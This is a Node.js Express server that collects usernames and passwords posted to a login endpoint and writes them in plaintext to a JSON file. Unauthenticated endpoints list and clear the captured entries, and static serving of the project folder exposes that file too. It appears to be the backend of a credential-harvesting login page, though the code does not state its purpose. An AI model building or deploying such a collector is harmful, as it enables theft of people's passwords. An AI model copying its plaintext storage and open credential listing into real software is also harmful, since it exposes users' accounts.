const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Serve static files from current directory

// Root route - Landing page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public_index.html'));
});

// Path to credentials database file
const dbPath = path.join(__dirname, 'credentials.json');

// Initialize database file if it doesn't exist
if (!fs.existsSync(dbPath)) {
    fs.writeFileSync(dbPath, JSON.stringify({ credentials: [] }, null, 2));
}

// API endpoint to save login credentials
app.post('/api/login', (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username and password are required' 
            });
        }

        // Read existing data
        const data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        
        // Add new credential with timestamp
        const newCredential = {
            username,
            password,
            timestamp: new Date().toISOString(),
            date: new Date().toLocaleString()
        };
        
        data.credentials.push(newCredential);
        
        // Write back to file
        fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
        
        console.log('New credential stored:', { username, date: newCredential.date });
        
        res.json({ 
            success: true, 
            message: 'Credentials stored successfully' 
        });
    } catch (error) {
        console.error('Error saving credentials:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error occurred' 
        });
    }
});

// API endpoint to get all credentials
app.get('/api/credentials', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        res.json({ 
            success: true, 
            credentials: data.credentials 
        });
    } catch (error) {
        console.error('Error reading credentials:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error occurred',
            credentials: [] 
        });
    }
});

// API endpoint to clear all credentials
app.delete('/api/credentials', (req, res) => {
    try {
        fs.writeFileSync(dbPath, JSON.stringify({ credentials: [] }, null, 2));
        res.json({ 
            success: true, 
            message: 'All credentials cleared' 
        });
    } catch (error) {
        console.error('Error clearing credentials:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error occurred' 
        });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n✅ Server is running on port ${PORT}`);
    console.log(`📊 Database file: ${dbPath}`);
    console.log(`🔐 Login page: /src/html/loginPage.html`);
    console.log(`📋 View credentials: /src/html/viewCredentials.html\n`);
});
